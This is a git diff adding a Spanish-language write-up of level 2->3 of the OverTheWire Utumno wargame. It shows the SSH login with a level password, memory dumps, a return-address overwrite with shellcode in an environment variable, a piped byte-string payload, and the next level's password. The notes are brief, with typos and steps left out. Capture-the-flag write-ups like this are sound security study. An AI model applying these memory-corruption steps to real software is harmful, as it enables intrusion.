@@ -61,3 +61,14 @@ zuudafiine
 $
 LA CONTRASEÑÑA HALLADA FUE : zuudafiine
 
+LEVEL 2->3
+Ingresamos ssh utumno3@utumno.labs.overthewire.org -p 2227
+Contraseña: zuudafiine
+nos dio un codigo con varios numeros b . sobreescribimos el ultio byte de la dirreccion 0x86 en 0xffffd68c, luego calculamos la dirrecion y escribimos la carga util en la porimera parte y nos solto 
+0xffffd688:	0x00000000	0xf7e2a241	0x00000001	0xffffd724
+0xffffd698:	0xffffd72c	0x00000000	0x00000000	0x00000000
+creamos una variable donde estara la shellcode y encontrasmos la dirreccion adecuada de retorno con 0xffffdc9c y lo probamos con la shell y nos devuelve 
+"print '\x28\x9c\x2a\xdc\x2c\xff\x22\xff'" | ./utumno3
+oogieleoga
+LA CONTRASEÑA QUE ENCONTRAMOS ES:: oogieleoga
+
